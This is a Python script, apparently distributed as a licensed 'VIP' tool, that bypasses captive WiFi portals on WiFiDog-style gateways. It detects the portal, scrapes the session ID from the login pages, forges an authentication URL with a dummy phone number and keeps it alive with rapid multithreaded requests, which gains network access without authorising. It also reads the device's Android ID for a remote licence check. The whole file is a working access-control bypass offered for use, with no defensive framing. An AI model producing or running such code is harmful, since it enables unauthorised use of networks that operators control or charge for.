#!/usr/bin/env python

import requests
import re
import urllib3
import time
import threading
import random
import os
import json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# VIP CONFIGURATION
# ===============================
JSON_URL = "https://raw.githubusercontent.com/ahlflk/AHLFLK_WiFi_Bypass_VIP/refs/heads/main/vip_user.json"
ID_STORE = ".dev_id.txt"
LIC_FILE = ".ahlflk_data.lic"

# ===============================
# CONFIG & COLORS
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

ORANGE = "\033[38;5;208m"
BOLD = "\033[1m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
RESET = "\033[00m"

stop_event = threading.Event()

# ===============================
# UTILS & HEADER
# ===============================
def print_header(text):
    line = "═" * (len(text) + 4)
    print(f"\n{ORANGE}╔{line}╗")
    print(f"║  {BOLD}{text}{RESET}{ORANGE}  ║")
    print(f"╚{line}╝{RESET}")

def get_fixed_id():
    if os.path.exists(ID_STORE):
        with open(ID_STORE, "r") as f:
            return f.read().strip()
    
    dev_id = ""
    try:
        dev_id = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
    except:
        dev_id = ''.join(random.choices('0123456789ABCDEF', k=10))

    full_id = f"AHLFLK_{dev_id.upper()[:10]}"
    with open(ID_STORE, "w") as f:
        f.write(full_id)
    return full_id

# ===============================
# VIP CHECK (OFFLINE-FIRST)
# ===============================
def check_vip():
    my_id = get_fixed_id()
    os.system('clear')
    
    print_header("AHLFLK VIP SYSTEM")

    if os.path.exists(LIC_FILE):
        try:
            with open(LIC_FILE, "r") as f:
                lic_data = json.load(f)
            if lic_data.get("id") == my_id:
                print(f"{GREEN}✅ License Verified (Offline Mode){RESET}")
                print(f"{CYAN}User    : {lic_data.get('key')}{RESET}")
                print(f"{CYAN}Expires : {lic_data.get('expiry')}{RESET}")
                print("-" * 40)
                time.sleep(1.5)
                return True
        except: pass

    print(f"{CYAN}YOUR ID : {RESET}{YELLOW}{my_id}{RESET}")
    print(f"{RED}[!] Offline activation not found.{RESET}")
    print(f"[*] Connecting to GitHub Server...")

    try:
        response = requests.get(JSON_URL, timeout=10)
        vip_data = response.json()
        
        if my_id in vip_data:
            user = vip_data[my_id]
            if user.get("Status") == "ACTIVE":
                new_lic = {"id": my_id, "key": user.get("Name"), "expiry": user.get("Expiration")}
                with open(LIC_FILE, "w") as f:
                    json.dump(new_lic, f, indent=4)
                print(f"{GREEN}✅ Activation Successful!{RESET}")
                time.sleep(2)
                return True
        
        print(f"{RED}❌ ID not registered. Send ID to Admin.{RESET}")
        return False
    except:
        print(f"{RED}❌ Connection Error! Need internet to activate first.{RESET}")
        return False

# ===============================
# NETWORK FUNCTIONS
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.ruijienetworks.com", timeout=3).status_code == 200
    except:
        return False

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    ping_count = 0
    success_count = 0
    while not stop_event.is_set():
        try:
            start = time.time()
            session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000
            ping_count += 1
            success_count += 1
            print(f"✅ SID {sid} | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}", end="\r")
        except:
            ping_count += 1
            print(f"❌ SID {sid} | Disconnected | Success: {success_count}/{ping_count}", end="\r")
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    if not check_vip():
        input(f"\n{YELLOW}Press Enter to exit...{RESET}")
        return

    print_header("AHLFLK WiFi Bypass Tool")
    print(f"{CYAN}[*] Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
                if check_real_internet():
                    print(f"🔵 Internet Active... Monitoring", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            print(f"\n{CYAN}[*] Portal Detected: {portal_host}{RESET}")

            # Capture SID
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if not sid:
                time.sleep(5)
                continue

            print(f"✅ SID Captured: {sid}")

            # Auth Link Build
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print_header("Turbo Threads Active")
            for i in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            last_status = False
            while not stop_event.is_set():
                is_connected = check_real_internet()
                if is_connected and not last_status:
                    print(f"\n✅ Internet Connected!")
                elif not is_connected and last_status:
                    print(f"\n❌ Disconnected! Reconnecting...")
                last_status = is_connected
                time.sleep(2)

        except KeyboardInterrupt:
            raise
        except:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n\n🛑 Shutdown...")
